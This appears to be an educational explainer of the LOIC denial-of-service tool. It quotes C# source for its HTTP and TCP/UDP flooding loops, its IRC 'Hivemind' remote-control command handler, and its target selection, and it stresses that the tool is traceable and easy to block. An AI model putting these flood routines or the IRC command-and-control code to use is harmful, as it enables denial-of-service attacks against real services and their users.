# LOIC Code Explanation

This document explains the key functionality of LOIC with code snippets to demonstrate how it works. The purpose is to understand the tool's capabilities for educational purposes without encouraging misuse.

## Key Components

### 1. Attack Methods

LOIC has several attack methods, with the main ones being:

#### HTTP Flooding (HTTPFlooder.cs)
```csharp
// Creates random HTTP headers to send to the target
byte[] buf = Functions.RandomHttpHeader((UseGet ? "GET" : "HEAD"), Subsite, Host, Random, AllowGzip);

// Sends the request
socket.Send(buf, SocketFlags.None);
State = ReqState.Downloading; Requested++; 

// Optionally waits for response
if (Resp)
{
    socket.ReceiveTimeout = Timeout;
    socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
}
```

#### TCP/UDP Flooding (XXPFlooder.cs)
```csharp
// TCP flooding
while (this.IsFlooding)
{
    Requested++;
    byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
    socket.Send(buf);
    if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
}

// UDP flooding
while (this.IsFlooding)
{
    Requested++;
    byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
    socket.SendTo(buf, SocketFlags.None, RHost);
    if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
}
```

### 2. "Hivemind" IRC Control (frmMain.cs)

The Hivemind feature allows LOIC to be controlled remotely via IRC:

```csharp
// Setting up IRC client
irc = new IrcClient();
irc.OnConnected += IrcConnected;
irc.OnReadLine += OnReadLine;
irc.OnChannelMessage += OnMessage;
// ... other event handlers

// Connecting to IRC server
int port;
if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
irc.Connect(txtIRCserver.Text, port);
channel = txtIRCchannel.Text.ToLowerInvariant();

irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");

// Command parsing from IRC messages
void OnMessage(object sender, IrcEventArgs e)
{
    if (e.Data.Channel.ToLowerInvariant() == channel)
    {
        if (e.Data.Message.StartsWith("!lazor "))
        {
            //authenticate
            if (OpList != null && OpList.ContainsKey(e.Data.Nick))
            {
                List<string> pars = new List<string>(e.Data.Message.Split(' '));
                SetStatus("Controlled by "+e.Data.Nick);
                try
                {
                    txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
                }
                catch
                { }
            }
        }
    }
}
```

### 3. Target Selection (frmMain.cs)

LOIC allows targeting via IP address or URL:

```csharp
// Targeting by IP
private void LockOnIP(bool silent = false)
{
    try
    {
        string tIP = txtTargetIP.Text.Trim().ToLowerInvariant();
        if(tIP.Length == 0)
        {
            Wtf ("I think you forgot the IP.", silent);
            return;
        }
        try
        {
            txtTarget.Text = sTargetHost = sTargetIP = IPAddress.Parse(tIP).ToString();
            if(sTargetHost.Contains(":"))
            {
                sTargetHost = "[" + sTargetHost.Trim('[', ']') + "]";
            }
        }
        catch(FormatException)
        {
            Wtf ("I don't think an IP is supposed to be written like THAT.", silent);
            return;
        }
    }
    catch(Exception ex)
    {
        Wtf (ex.Message, silent);
        return;
    }
}

// Targeting by URL
private void LockOnURL(bool silent = false)
{
    try
    {
        string tURL = txtTargetURL.Text.Trim().ToLowerInvariant();
        if(tURL.Length == 0)
        {
            Wtf ("A URL is fine too...", silent);
            return;
        }
        if(!tURL.Contains("://"))
        {
            tURL = String.Concat("http://", tURL);
        }
        try
        {
            tURL = new Uri(tURL).Host;
            txtTarget.Text = sTargetIP = (Functions.RandomElement(Dns.GetHostEntry(tURL).AddressList) as IPAddress).ToString();
            txtTargetURL.Text = sTargetHost = tURL;
        }
        catch(UriFormatException)
        {
            Wtf ("I don't think a URL is supposed to be written like THAT.", silent);
            return;
        }
        catch(SocketException)
        {
            Wtf ("The URL you entered does not resolve to an IP!", silent);
            return;
        }
    }
    catch(Exception ex)
    {
        Wtf (ex.Message, silent);
        return;
    }
}
```

## Important Notes About LOIC's Design

### 1. No IP Hiding
LOIC makes no attempt to hide the user's IP address. This means:
- All attacks are easily traceable back to the attacker
- The user's identity is fully exposed to the target

### 2. Simple Attack Methods
LOIC uses basic flooding techniques that:
- Are easily detected by modern security systems
- Can be quickly blocked by firewalls
- Don't employ sophisticated evasion techniques

### 3. Warning in Code
The code itself contains warnings about potential legal consequences:

```csharp
/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */
```

The term "v&" is slang for "vanned" - meaning arrested by authorities.

## Conclusion

LOIC is a relatively simple network stress testing tool that:
1. Uses basic flooding techniques
2. Makes no attempt to hide the user's identity
3. Can be controlled remotely through IRC
4. Contains explicit warnings about legal consequences

Modern security systems can easily detect and block LOIC attacks, and the tool's design makes it trivial to identify the attacker. This analysis is provided purely for educational purposes to understand how such tools function.